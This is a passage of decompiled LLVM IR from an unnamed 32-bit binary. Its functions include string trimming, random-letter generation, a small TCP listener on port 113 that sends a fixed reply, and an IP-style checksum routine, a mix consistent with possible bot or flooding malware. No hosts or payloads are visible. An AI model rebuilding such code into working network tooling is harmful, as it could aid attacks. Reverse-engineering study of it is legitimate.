  br i1 %v1_804840f, label %dec_label_pc_8048423, label %dec_label_pc_8048411

dec_label_pc_8048411:                             ; preds = %dec_label_pc_8048407
  %v2_8048419 = call i32 @function_804d799(i32 %v1_80483f4)
  br label %dec_label_pc_8048450

dec_label_pc_8048423:                             ; preds = %dec_label_pc_8048407
  %v1_8048423 = call i32 @function_804ed9c(i32 %tmp3)
  %v0_804842a = load i64, i64* @global_var_80564ac.12, align 8
  %sext = mul i64 %v0_804842a, 4294967296
  %v5_804842f = sdiv i64 %sext, 4294967296
  %v6_8048439 = zext i32 %v1_8048423 to i64
  %v14_8048439 = urem i64 %v6_8048439, %v5_804842f
  %v15_8048439 = trunc i64 %v14_8048439 to i32
  %v0_804843c = load i8*, i8** @global_var_80564a8.11, align 4
  %v1_804843c = ptrtoint i8* %v0_804843c to i32
  %v2_8048441 = add i32 %v15_8048439, 1
  %v1_8048444 = add i32 %v2_8048441, %v1_804843c
  %v2_8048448 = call i32 @function_804d799(i32 %v1_8048444)
  br label %dec_label_pc_8048450

dec_label_pc_8048450:                             ; preds = %dec_label_pc_8048411, %dec_label_pc_80483fd, %dec_label_pc_8048423
  %stack_var_-8.0 = phi i32 [ %v2_8048448, %dec_label_pc_8048423 ], [ %v2_8048419, %dec_label_pc_8048411 ], [ %v1_80483fd, %dec_label_pc_80483fd ]
  ret i32 %stack_var_-8.0

; uselistorder directives
  uselistorder i32 (i32)* @function_804d799, { 1, 0 }
  uselistorder label %dec_label_pc_8048450, { 2, 0, 1 }
}

define i32 @function_8048455(i8* %arg1) local_unnamed_addr {
dec_label_pc_8048455:
  %v4_804847d = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_804847d

dec_label_pc_804845e:                             ; preds = %dec_label_pc_80484a0, %dec_label_pc_804847d
  %v3_804846f = call i32 @_strlen(i8* %arg1)
  %v6_8048476 = add i32 %v4_804847d, %v3_804846f
  %v1_8048479 = add i32 %v6_8048476, -1
  %v1_804847a = inttoptr i32 %v1_8048479 to i8*
  store i8 0, i8* %v1_804847a, align 1
  br label %dec_label_pc_804847d

dec_label_pc_804847d:                             ; preds = %dec_label_pc_8048455, %dec_label_pc_804845e
  %v3_804848e = call i32 @_strlen(i8* %arg1)
  %v6_8048495 = add i32 %v4_804847d, %v3_804848e
  %v1_8048498 = add i32 %v6_8048495, -1
  %v1_8048499 = inttoptr i32 %v1_8048498 to i8*
  %v2_8048499 = load i8, i8* %v1_8048499, align 1
  %v10_804849c = icmp eq i8 %v2_8048499, 13
  br i1 %v10_804849c, label %dec_label_pc_804845e, label %dec_label_pc_80484a0

dec_label_pc_80484a0:                             ; preds = %dec_label_pc_804847d
  %v3_80484b1 = call i32 @_strlen(i8* %arg1)
  %v6_80484b8 = add i32 %v4_804847d, %v3_80484b1
  %v1_80484bb = add i32 %v6_80484b8, -1
  %v1_80484bc = inttoptr i32 %v1_80484bb to i8*
  %v2_80484bc = load i8, i8* %v1_80484bc, align 1
  %v11_80484bf = icmp eq i8 %v2_80484bc, 10
  br i1 %v11_80484bf, label %dec_label_pc_804845e, label %dec_label_pc_80484c3

dec_label_pc_80484c3:                             ; preds = %dec_label_pc_80484a0
  %v1_80484c8 = sext i8 %v2_80484bc to i32
  ret i32 %v1_80484c8

; uselistorder directives
  uselistorder i8 %v2_80484bc, { 1, 0 }
  uselistorder i32 %v4_804847d, { 1, 2, 0 }
  uselistorder i8* %arg1, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804847d, { 1, 0 }
}

define i32 @function_80484c9() local_unnamed_addr {
dec_label_pc_80484c9:
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i8*, align 4
  %stack_var_-1060 = alloca i32, align 4
  %v0_80484ce = load i32, i32* @ebx, align 4
  %v1_80484d5 = call i32 @function_804ed9c(i32 %v0_80484ce)
  %v2_80484f7 = sdiv i32 %v1_80484d5, 5
  store i32 %v2_80484f7, i32* @ebx, align 4
  %tmp28 = mul i32 %v2_80484f7, -5
  %v2_8048510 = add i32 %tmp28, %v1_80484d5
  store i32 %v2_8048510, i32* @esi, align 4
  %v1_804851e = add i32 %v2_8048510, 4
  %v1_8048527 = add i32 %v2_8048510, 5
  %v2_804852b = call i32 @function_804ddba(i32 %v1_8048527)
  %tmp29 = bitcast i8** %stack_var_-36 to i32*
  store i32 %v2_804852b, i32* %tmp29, align 4
  %tmp30 = inttoptr i32 %v2_804852b to i8*
  store i32 %v2_804852b, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_8048541 = and i32 %v2_804852b, -256
  store i32 %v1_8048541, i32* @eax, align 4
  %v5_8048543 = call i8* @_memset(i8* %tmp30, i32 %v1_8048541, i32 %v1_8048527)
  %v3_8048554 = call i32 @function_804bbbc(i32 ptrtoint ([16 x i8]* @global_var_80528d0.14 to i32), i32 ptrtoint (i32* @global_var_80528ce.13 to i32))
  store i32 %v3_8048554, i32* @eax, align 4
  %v4_804855c = icmp eq i32 %v3_8048554, 0
  %v1_8048560 = icmp eq i1 %v4_804855c, false
  br i1 %v1_8048560, label %dec_label_pc_80485dc, label %dec_label_pc_80485cf.preheader

dec_label_pc_80485cf.preheader:                   ; preds = %dec_label_pc_80484c9
  %v5_80485d546 = icmp sgt i32 %v1_804851e, 0
  br i1 %v5_80485d546, label %dec_label_pc_804856b, label %dec_label_pc_80486cf

dec_label_pc_804856b:                             ; preds = %dec_label_pc_804856b, %dec_label_pc_80485cf.preheader
  %v4_8048570 = phi i8* [ %tmp30, %dec_label_pc_80485cf.preheader ], [ %v3_80486cf.pre.pre, %dec_label_pc_804856b ]
  %storemerge47 = phi i32 [ 0, %dec_label_pc_80485cf.preheader ], [ %v4_80485cc, %dec_label_pc_804856b ]
  store i32 %storemerge47, i32* @eax, align 4
  %v5_8048570 = ptrtoint i8* %v4_8048570 to i32
  %v6_8048570 = add i32 %v5_8048570, %storemerge47
  store i32 %v6_8048570, i32* @ebx, align 4
  %v1_8048573 = call i32 @function_804ed9c(i32 %storemerge47)
  %v2_8048596 = srem i32 %v1_8048573, 26
  %v14_80485b9 = trunc i32 %v2_8048596 to i8
  %v2_80485c8 = add i8 %v14_80485b9, 65
  %v2_80485ca = load i32, i32* @ebx, align 4
  %v3_80485ca = inttoptr i32 %v2_80485ca to i8*
  store i8 %v2_80485c8, i8* %v3_80485ca, align 1
  %v4_80485cc = add nuw nsw i32 %storemerge47, 1
  %exitcond = icmp eq i32 %v4_80485cc, %v1_804851e
  %v3_80486cf.pre.pre = load i8*, i8** %stack_var_-36, align 4
  br i1 %exitcond, label %dec_label_pc_80486cf, label %dec_label_pc_804856b

dec_label_pc_80485dc:                             ; preds = %dec_label_pc_80484c9
  %v1_80485dc = call i32 @function_804ed9c(i32 %v3_8048554)
  store i32 %v1_80485dc, i32* @eax, align 4
  store i32 %v1_80485dc, i32* @ebx, align 4
  %v1_80485e3 = call i32 @function_804ed9c(i32 %tmp14)
  %v0_80485e8 = load i32, i32* @ebx, align 4
  %v5_80485ea = mul i32 %v0_80485e8, %v1_80485e3
  store i32 %v5_80485ea, i32* @ecx, align 4
  %v2_804860e = sdiv i32 %v5_80485ea, 12039
  store i32 %v2_804860e, i32* @ebx, align 4
  %tmp50 = mul i32 %v2_804860e, -45402
  %v2_8048622 = add i32 %v5_80485ea, %tmp50
  store i32 %v2_8048622, i32* @esi, align 4
  %v1_8048630 = add i32 %v2_8048622, 1
  %v2_8048665 = ptrtoint i32* %stack_var_-1060 to i32
  %tmp32 = bitcast i32* %stack_var_-1060 to i8*
  %v5_804866034 = sub i32 -1, %v2_8048622
  %v13_804866036 = and i32 %v5_804866034, %v1_8048630
  %v14_804866037 = icmp slt i32 %v13_804866036, 0
  %v16_804866039 = icmp slt i32 %v5_804866034, 0
  %v2_804866340 = icmp eq i1 %v16_804866039, %v14_804866037
  br i1 %v2_804866340, label %dec_label_pc_8048665, label %dec_label_pc_804863d

dec_label_pc_804863d:                             ; preds = %dec_label_pc_80485dc, %dec_label_pc_804863d
  %storemerge841 = phi i32 [ %v4_804865a, %dec_label_pc_804863d ], [ 0, %dec_label_pc_80485dc ]
  %v4_8048655 = call i32 @function_804cf58(i32 %v2_8048665, i32 1024, i32 %v3_8048554)
  %v4_804865a = add i32 %storemerge841, 1
  %v5_8048660 = sub i32 %v4_804865a, %v1_8048630
  %v11_8048660 = xor i32 %v4_804865a, %v1_8048630
  %v12_8048660 = xor i32 %v5_8048660, %v4_804865a
  %v13_8048660 = and i32 %v12_8048660, %v11_8048660
  %v14_8048660 = icmp slt i32 %v13_8048660, 0
  %v16_8048660 = icmp slt i32 %v5_8048660, 0
  %v2_8048663 = icmp eq i1 %v16_8048660, %v14_8048660
  br i1 %v2_8048663, label %dec_label_pc_8048665, label %dec_label_pc_804863d

dec_label_pc_8048665:                             ; preds = %dec_label_pc_804863d, %dec_label_pc_80485dc
  store i32 %v2_8048665, i32* @edx, align 4
  %v5_8048681 = call i32 @function_804d4e0(i8* %tmp32, i32 0, i32 1024)
  %v4_804869e = call i32 @function_804cf58(i32 %v2_8048665, i32 1024, i32 %v3_8048554)
  %v3_80486ac = call i32 @function_8048455(i8* %tmp32)
  store i32 %v2_804852b, i32* @edi, align 4
  store i32 %v2_8048665, i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_80486c2 = call i8* @_memcpy(i8* %tmp30, i8* %tmp32, i32 %v1_804851e)
  %v8_80486c2 = ptrtoint i8* %v7_80486c2 to i32
  store i32 %v8_80486c2, i32* @ecx, align 4
  store i32 %v3_8048554, i32* @eax, align 4
  %tmp33 = inttoptr i32 %v3_8048554 to i16*
  %v3_80486ca = call i32 @function_804baac(i16* %tmp33)
  br label %dec_label_pc_80486cf

dec_label_pc_80486cf:                             ; preds = %dec_label_pc_804856b, %dec_label_pc_80485cf.preheader, %dec_label_pc_8048665
  %v3_80486cf = phi i8* [ %tmp30, %dec_label_pc_8048665 ], [ %tmp30, %dec_label_pc_80485cf.preheader ], [ %v3_80486cf.pre.pre, %dec_label_pc_804856b ]
  %v4_80486cf = ptrtoint i8* %v3_80486cf to i32
  ret i32 %v4_80486cf

; uselistorder directives
  uselistorder i32 %v5_8048660, { 1, 0 }
  uselistorder i32 %v4_804865a, { 3, 2, 1, 0 }
  uselistorder i32 %v5_804866034, { 1, 0 }
  uselistorder i8* %tmp32, { 2, 1, 0 }
  uselistorder i32 %v1_8048630, { 1, 2, 0 }
  uselistorder i32 %v2_8048622, { 2, 1, 0 }
  uselistorder i32 %v2_804860e, { 1, 0 }
  uselistorder i32 %v5_80485ea, { 1, 0, 2 }
  uselistorder i32 %v4_80485cc, { 1, 0 }
  uselistorder i32 %storemerge47, { 2, 1, 3, 0 }
  uselistorder i32 %v3_8048554, { 2, 1, 3, 0, 4, 5, 6 }
  uselistorder i8* %tmp30, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_804851e, { 2, 0, 1 }
  uselistorder i32 %v2_8048510, { 2, 1, 0 }
  uselistorder i32 %v2_80484f7, { 1, 0 }
  uselistorder i32 %v1_80484d5, { 1, 0 }
  uselistorder label %dec_label_pc_80486cf, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804863d, { 1, 0 }
}

define i32 @function_80486dd() local_unnamed_addr {
dec_label_pc_80486dd:
  %stack_var_-1092 = alloca i32, align 4
  %stack_var_-1100 = alloca i32, align 4
  %stack_var_-1228 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v4_80486fe = call i32 @function_804dd68(i32 2, i32 1, i32 0)
  %v13_8048706 = icmp eq i32 %v4_80486fe, -1
  br i1 %v13_8048706, label %dec_label_pc_804895c, label %dec_label_pc_8048710

dec_label_pc_8048710:                             ; preds = %dec_label_pc_80486dd
  store i32 2, i32* %stack_var_-52, align 4
  %v2_804871d = call i32 @function_804d778(i16 113)
  %v2_8048730 = ptrtoint i32* %stack_var_-52 to i32
  %v4_8048758 = call i32 @function_804dc38(i32 %v4_80486fe, i32 %v2_8048730, i32 16)
  %v10_804875d = icmp eq i32 %v4_8048758, -1
  br i1 %v10_804875d, label %dec_label_pc_804895c, label %dec_label_pc_8048766

dec_label_pc_8048766:                             ; preds = %dec_label_pc_8048710
  %v3_8048774 = call i32 @function_804dc90(i32 %v4_80486fe, i32 1)
  %v10_8048779 = icmp eq i32 %v3_8048774, -1
  br i1 %v10_8048779, label %dec_label_pc_804895c, label %dec_label_pc_8048782

dec_label_pc_8048782:                             ; preds = %dec_label_pc_8048766
  %v0_8048782 = call i32 @function_804b808()
  %v1_8048787 = icmp eq i32 %v0_8048782, 0
  br i1 %v1_8048787, label %dec_label_pc_804895c, label %dec_label_pc_804878f

dec_label_pc_804878f:                             ; preds = %dec_label_pc_8048782
  store i32 16, i32* %stack_var_-36, align 4
  %v2_8048796 = ptrtoint i32* %stack_var_-36 to i32
  %v2_8048799 = ptrtoint i32* %stack_var_-68 to i32
  %v4_80487aa = call i32 @function_804dc0c(i32 %v4_80486fe, i32 %v2_8048799, i32 %v2_8048796)
  store i32 %v4_80487aa, i32* @eax, align 4
  %v4_80487b2 = add i32 %v4_80487aa, 1
  %v13_80487b2 = icmp eq i32 %v4_80487b2, 0
  %v1_80487b6 = icmp eq i1 %v13_80487b2, false
  br i1 %v1_80487b6, label %dec_label_pc_80487c4.preheader, label %dec_label_pc_80487b8

dec_label_pc_80487b8:                             ; preds = %dec_label_pc_804878f
  %v1_80487bf = call i32 @function_804f274(i32 0)
  br label %dec_label_pc_80487c4.preheader

dec_label_pc_80487c4.preheader:                   ; preds = %dec_label_pc_80487b8, %dec_label_pc_804878f
  %v2_80487ce = ptrtoint i32* %stack_var_-1228 to i32
  %tmp27 = bitcast i32* %stack_var_-1228 to i8*
  %v2_80487e2 = udiv i32 %v4_80487aa, 32
  %v1_80487e8 = urem i32 %v4_80487aa, 32
  %v9_80487eb = shl i32 1, %v1_80487e8
  %v2_804880d = ptrtoint i32* %stack_var_-1100 to i32
  %v2_8048857 = mul nuw nsw i32 %v2_80487e2, 4
  %v3_8048857 = add nsw i32 %v2_8048857, -1224
  br label %dec_label_pc_80487c4

dec_label_pc_80487c4:                             ; preds = %dec_label_pc_80487c4.preheader, %dec_label_pc_8048849
  store i32 %v2_80487ce, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_80487d5 = call i8* @_memset(i8* %tmp27, i32 0, i32 32)
  %v0_80487eb = load i32, i32* @ebp, align 4
  %v4_80487eb = add i32 %v3_8048857, %v0_80487eb
  %v5_80487eb = inttoptr i32 %v4_80487eb to i32*
  %v6_80487eb = load i32, i32* %v5_80487eb, align 4
  %v12_80487eb = or i32 %v6_80487eb, %v9_80487eb
  store i32 %v12_80487eb, i32* %v5_80487eb, align 4
  store i32 60, i32* %stack_var_-1100, align 4
  %v6_8048834 = call i32 @function_804b9c0(i32 %v4_80487b2, i32 %v2_80487ce, i32 0, i32 0, i32 %v2_804880d)
  store i32 %v6_8048834, i32* @eax, align 4
  %v2_8048839 = icmp slt i32 %v6_8048834, 0
  %v1_804883b = icmp eq i1 %v2_8048839, false
  br i1 %v1_804883b, label %dec_label_pc_8048849, label %dec_label_pc_804883d

dec_label_pc_804883d:                             ; preds = %dec_label_pc_80487c4
  %v1_8048844 = call i32 @function_804f274(i32 0)
  br label %dec_label_pc_8048849

dec_label_pc_8048849:                             ; preds = %dec_label_pc_80487c4, %dec_label_pc_804883d
  %v0_8048857 = load i32, i32* @ebp, align 4
  %v4_8048857 = add i32 %v3_8048857, %v0_8048857
  %v5_8048857 = inttoptr i32 %v4_8048857 to i32*
  %v6_8048857 = load i32, i32* %v5_8048857, align 4
  %v10_8048857 = and i32 %v6_8048857, %v9_80487eb
  %v11_8048857 = icmp ne i32 %v10_8048857, 0
  %v4_8048862 = icmp eq i1 %v11_8048857, false
  %v1_8048864 = icmp eq i1 %v4_8048862, false
  br i1 %v1_8048864, label %dec_label_pc_804886b, label %dec_label_pc_80487c4

dec_label_pc_804886b:                             ; preds = %dec_label_pc_8048849
  %v2_804887b = ptrtoint i32* %stack_var_-1092 to i32
  %v5_804888b = call i32 @function_804dcb4(i32 %v4_80487aa, i32 %v2_804887b, i32 1024, i32 0)
  store i32 %v5_804888b, i32* @eax, align 4
  %tmp28 = icmp slt i32 %v5_804888b, 1
  br i1 %tmp28, label %dec_label_pc_804889f, label %dec_label_pc_8048899

dec_label_pc_8048899:                             ; preds = %dec_label_pc_804886b
  %v7_804889d = icmp sgt i32 %v5_804888b, 19
  br i1 %v7_804889d, label %dec_label_pc_804889f, label %dec_label_pc_80488ab

dec_label_pc_804889f:                             ; preds = %dec_label_pc_8048899, %dec_label_pc_804886b
  %v1_80488a6 = call i32 @function_804f274(i32 0)
  br label %dec_label_pc_80488ab

dec_label_pc_80488ab:                             ; preds = %dec_label_pc_8048899, %dec_label_pc_804889f
  %v0_80488ae = load i32, i32* @ebp, align 4
  %v2_80488ae = add i32 %v5_804888b, -1088
  %v3_80488ae = add i32 %v2_80488ae, %v0_80488ae
  %v4_80488ae = inttoptr i32 %v3_80488ae to i8*
  store i8 0, i8* %v4_80488ae, align 1
  %v0_80488ba = load i32, i32* @ebp, align 4
  %v2_80488ba = add i32 %v5_804888b, -1089
  %v3_80488ba = add i32 %v2_80488ba, %v0_80488ba
  %v4_80488ba = inttoptr i32 %v3_80488ba to i8*
  %v5_80488ba = load i8, i8* %v4_80488ba, align 1
  %v10_80488c2 = icmp eq i8 %v5_80488ba, 10
  br i1 %v10_80488c2, label %dec_label_pc_80488d6, label %dec_label_pc_80488c6

dec_label_pc_80488c6:                             ; preds = %dec_label_pc_80488ab
  %v5_80488ca = load i8, i8* %v4_80488ba, align 1
  %v10_80488d2 = icmp eq i8 %v5_80488ca, 13
  %v1_80488d4 = icmp eq i1 %v10_80488d2, false
  br i1 %v1_80488d4, label %dec_label_pc_80488e2, label %dec_label_pc_80488d6

dec_label_pc_80488d6:                             ; preds = %dec_label_pc_80488c6, %dec_label_pc_80488ab
  store i8 0, i8* %v4_80488ba, align 1
  %v0_80488e8.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_80488e2

dec_label_pc_80488e2:                             ; preds = %dec_label_pc_80488c6, %dec_label_pc_80488d6
  %v0_804890c = phi i32 [ %v0_80488ba, %dec_label_pc_80488c6 ], [ %v0_80488e8.pre, %dec_label_pc_80488d6 ]
  %v2_80488e8 = add i32 %v5_804888b, -1090
  %v3_80488e8 = add i32 %v2_80488e8, %v0_804890c
  %v4_80488e8 = inttoptr i32 %v3_80488e8 to i8*
  %v5_80488e8 = load i8, i8* %v4_80488e8, align 1
  %v10_80488f0 = icmp eq i8 %v5_80488e8, 10
  br i1 %v10_80488f0, label %dec_label_pc_8048906, label %dec_label_pc_80488f4

dec_label_pc_80488f4:                             ; preds = %dec_label_pc_80488e2
  %v5_80488fa = load i8, i8* %v4_80488e8, align 1
  %v10_8048902 = icmp eq i8 %v5_80488fa, 13
  %v1_8048904 = icmp eq i1 %v10_8048902, false
  br i1 %v1_8048904, label %dec_label_pc_8048914, label %dec_label_pc_8048906

dec_label_pc_8048906:                             ; preds = %dec_label_pc_80488f4, %dec_label_pc_80488e2
  store i8 0, i8* %v4_80488e8, align 1
  br label %dec_label_pc_8048914

dec_label_pc_8048914:                             ; preds = %dec_label_pc_80488f4, %dec_label_pc_8048906
  %v3_8048935 = call i32 @function_80482b3(i32 %v4_80487aa, i32 ptrtoint ([25 x i8]* @global_var_80528e0.16 to i32))
  %v1_8048940 = call i32 @function_804b7d8(i32 %v4_80487aa)
  %v1_804894b = call i32 @function_804b7d8(i32 %v4_80486fe)
  store i32 %v1_804894b, i32* @eax, align 4
  %v1_8048957 = call i32 @function_804f274(i32 0)
  br label %dec_label_pc_804895c

dec_label_pc_804895c:                             ; preds = %dec_label_pc_8048782, %dec_label_pc_8048766, %dec_label_pc_8048710, %dec_label_pc_80486dd, %dec_label_pc_8048914
  %v0_8048964 = phi i32 [ 0, %dec_label_pc_8048782 ], [ %v3_8048774, %dec_label_pc_8048766 ], [ %v4_8048758, %dec_label_pc_8048710 ], [ %v4_80486fe, %dec_label_pc_80486dd ], [ %v1_8048957, %dec_label_pc_8048914 ]
  ret i32 %v0_8048964

; uselistorder directives
  uselistorder i32 %v5_804888b, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v3_8048857, { 1, 0 }
  uselistorder i32 %v4_80487aa, { 3, 2, 4, 1, 0, 5, 6 }
  uselistorder i32 %v3_8048774, { 1, 0 }
  uselistorder i32 %v4_8048758, { 1, 0 }
  uselistorder i32 %v4_80486fe, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32 ()* @function_804b808, { 1, 0 }
  uselistorder label %dec_label_pc_804895c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8048914, { 1, 0 }
  uselistorder label %dec_label_pc_80488e2, { 1, 0 }
  uselistorder label %dec_label_pc_80488ab, { 1, 0 }
  uselistorder label %dec_label_pc_8048849, { 1, 0 }
  uselistorder label %dec_label_pc_80487c4, { 1, 0 }
}

define i32 @function_8048965(i64 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8048965:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048965 = load i32, i32* @ebp, align 4
  store i32 %v0_8048965, i32* %stack_var_-4, align 4
  %v4_8048965 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048965, i32* @ebp, align 4
  %v4_804896b = icmp eq i32 %arg2, 0
  %v1_804896f = icmp eq i1 %v4_804896b, false
  br i1 %v1_804896f, label %dec_label_pc_804897a, label %dec_label_pc_80489a4

dec_label_pc_804897a:                             ; preds = %dec_label_pc_8048965
  %v4_804897a = add i32 %arg2, -1
  %v12_804897a = icmp eq i32 %v4_804897a, 0
  %v1_804897e = icmp eq i1 %v12_804897a, false
  br i1 %v1_804897e, label %dec_label_pc_8048988, label %dec_label_pc_8048980

dec_label_pc_8048980:                             ; preds = %dec_label_pc_804897a
  %v4_8048980 = trunc i64 %arg1 to i32
  br label %dec_label_pc_80489a4

dec_label_pc_8048988:                             ; preds = %dec_label_pc_804897a
  %v4_8048996 = call i32 @function_8048965(i64 %arg1, i32 %v4_804897a)
  %v6_804899d = sext i32 %v4_8048996 to i64
  %v8_804899d = mul nsw i64 %v6_804899d, %arg1
  %v9_804899d = trunc i64 %v8_804899d to i32
  br label %dec_label_pc_80489a4

dec_label_pc_80489a4:                             ; preds = %dec_label_pc_8048965, %dec_label_pc_8048980, %dec_label_pc_8048988
  %stack_var_-8.0.off0 = phi i32 [ %v9_804899d, %dec_label_pc_8048988 ], [ %v4_8048980, %dec_label_pc_8048980 ], [ 1, %dec_label_pc_8048965 ]
  ret i32 %stack_var_-8.0.off0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i64 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80489a4, { 2, 1, 0 }
}

define i32 @function_80489a9(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80489a9:
  %v0_80489a9 = load i32, i32* @ebp, align 4
  %v4_80489db17 = add i32 %arg2, -1
  %v9_80489db18 = sub i32 0, %arg2
  %v10_80489db19 = and i32 %arg2, %v9_80489db18
  %v11_80489db20 = icmp slt i32 %v10_80489db19, 0
  %v12_80489db21 = icmp eq i32 %v4_80489db17, 0
  %v13_80489db22 = icmp slt i32 %v4_80489db17, 0
  %v3_80489df23 = icmp eq i1 %v13_80489db22, %v11_80489db20
  %v4_80489df24 = icmp eq i1 %v12_80489db21, false
  %v5_80489df25 = and i1 %v4_80489df24, %v3_80489df23
  br i1 %v5_80489df25, label %dec_label_pc_80489ca, label %dec_label_pc_80489e1

dec_label_pc_80489ca:                             ; preds = %dec_label_pc_80489a9, %dec_label_pc_80489ca
  %stack_var_-24.028 = phi i16 [ %v6_80489d0, %dec_label_pc_80489ca ], [ 0, %dec_label_pc_80489a9 ]
  %stack_var_-28.027 = phi i16* [ %v23_80489d3, %dec_label_pc_80489ca ], [ %arg1, %dec_label_pc_80489a9 ]
  %v3_80489d726 = phi i32 [ %v4_80489d7, %dec_label_pc_80489ca ], [ %arg2, %dec_label_pc_80489a9 ]
  %v4_80489ca = ptrtoint i16* %stack_var_-28.027 to i32
  %v2_80489cd = load i16, i16* %stack_var_-28.027, align 2
  %v6_80489d0 = add i16 %v2_80489cd, %stack_var_-24.028
  %v5_80489d3 = add i32 %v4_80489ca, 2
  %v23_80489d3 = inttoptr i32 %v5_80489d3 to i16*
  %v4_80489d7 = add i32 %v3_80489d726, -2
  %v4_80489db = add i32 %v3_80489d726, -3
  %v9_80489db = sub i32 2, %v3_80489d726
  %v10_80489db = and i32 %v4_80489d7, %v9_80489db
  %v11_80489db = icmp slt i32 %v10_80489db, 0
  %v12_80489db = icmp eq i32 %v4_80489db, 0
  %v13_80489db = icmp slt i32 %v4_80489db, 0
  %v3_80489df = icmp eq i1 %v13_80489db, %v11_80489db
  %v4_80489df = icmp eq i1 %v12_80489db, false
  %v5_80489df = and i1 %v4_80489df, %v3_80489df
  br i1 %v5_80489df, label %dec_label_pc_80489ca, label %dec_label_pc_80489e1

dec_label_pc_80489e1:                             ; preds = %dec_label_pc_80489ca, %dec_label_pc_80489a9
  %stack_var_-28.0.lcssa = phi i16* [ %arg1, %dec_label_pc_80489a9 ], [ %v23_80489d3, %dec_label_pc_80489ca ]
  %stack_var_-24.0.lcssa = phi i16 [ 0, %dec_label_pc_80489a9 ], [ %v6_80489d0, %dec_label_pc_80489ca ]
  %v4_80489df.lcssa = phi i1 [ %v4_80489df24, %dec_label_pc_80489a9 ], [ %v4_80489df, %dec_label_pc_80489ca ]
  br i1 %v4_80489df.lcssa, label %dec_label_pc_80489f9, label %dec_label_pc_80489e7

dec_label_pc_80489e7:                             ; preds = %dec_label_pc_80489e1
  %v1_80489ed = bitcast i16* %stack_var_-28.0.lcssa to i8*
  %v2_80489ed = load i8, i8* %v1_80489ed, align 1
  %v3_80489ed = zext i8 %v2_80489ed to i16
  %v6_80489f6 = add i16 %v3_80489ed, %stack_var_-24.0.lcssa
  br label %dec_label_pc_80489f9

dec_label_pc_80489f9:                             ; preds = %dec_label_pc_80489e1, %dec_label_pc_80489e7
  %stack_var_-24.1 = phi i16 [ %stack_var_-24.0.lcssa, %dec_label_pc_80489e1 ], [ %v6_80489f6, %dec_label_pc_80489e7 ]
  %v4_80489f9 = sext i16 %stack_var_-24.1 to i32
  %v2_80489fc = sdiv i32 %v4_80489f9, 65536
  %v2_8048a03 = add nsw i32 %v2_80489fc, %v4_80489f9
  %sext = mul i32 %v2_8048a03, 65536
  %v4_8048a08 = sdiv i32 %sext, 65536
  %v2_8048a0b = ashr i32 %sext, 31
  %v6_8048a0e = add nsw i32 %v2_8048a0b, %v4_8048a08
  %sext4 = mul i32 %v6_8048a0e, 65536
  %tmp = sdiv i32 %sext4, -65536
  %v1_8048a15 = add i32 %tmp, -1
  store i32 %v0_80489a9, i32* @ebp, align 4
  ret i32 %v1_8048a15

; uselistorder directives
  uselistorder i32 %v4_80489f9, { 1, 0 }
  uselistorder i16 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i32 %v4_80489db, { 1, 0 }
  uselistorder i32 %v4_80489d7, { 1, 0 }
  uselistorder label %dec_label_pc_80489f9, { 1, 0 }
  uselistorder label %dec_label_pc_80489ca, { 1, 0 }
}

define i32 @function_8048a25(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8048a25:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-5192 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-1096 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8048a29 = load i32, i32* @esi, align 4
  store i32 %v0_8048a29, i32* %stack_var_-12, align 4
  %v2_8048a2a = icmp ult i32* %stack_var_-12, inttoptr (i32 5232 to i32*)
  store i1 %v2_8048a2a, i1* %cf.global-to-local, align 1
  %v1_8048a36 = call i32 @function_8048311(i32 %arg2)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048a3b = icmp eq i32 %v1_8048a36, 0
  %v1_8048a3d = icmp eq i1 %v1_8048a3b, false
  br i1 %v1_8048a3d, label %dec_label_pc_8048f45, label %dec_label_pc_8048a43

dec_label_pc_8048a43:                             ; preds = %dec_label_pc_8048a25
  %v4_8048a43 = add i32 %arg3, -1
  %v8_8048a43 = icmp eq i32 %arg3, 0
  %v9_8048a43 = sub i32 0, %arg3
  %v10_8048a43 = and i32 %arg3, %v9_8048a43
  %v11_8048a43 = icmp slt i32 %v10_8048a43, 0
  store i1 %v8_8048a43, i1* %cf.global-to-local, align 1
  %v12_8048a43 = icmp eq i32 %v4_8048a43, 0
  %v13_8048a43 = icmp slt i32 %v4_8048a43, 0
  %v3_8048a47 = icmp eq i1 %v13_8048a43, %v11_8048a43
  %v4_8048a47 = icmp eq i1 %v12_8048a43, false
  %v5_8048a47 = and i1 %v4_8048a47, %v3_8048a47
  br i1 %v5_8048a47, label %dec_label_pc_8048a6f, label %dec_label_pc_8048a49

dec_label_pc_8048a49:                             ; preds = %dec_label_pc_8048a43
  %v3_8048a5e = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([33 x i8]* @global_var_80528fc.17 to i32))
  store i32 %v3_8048a5e, i32* @eax, align 4
  %v1_8048a6a = call i32 @function_804f274(i32 0)
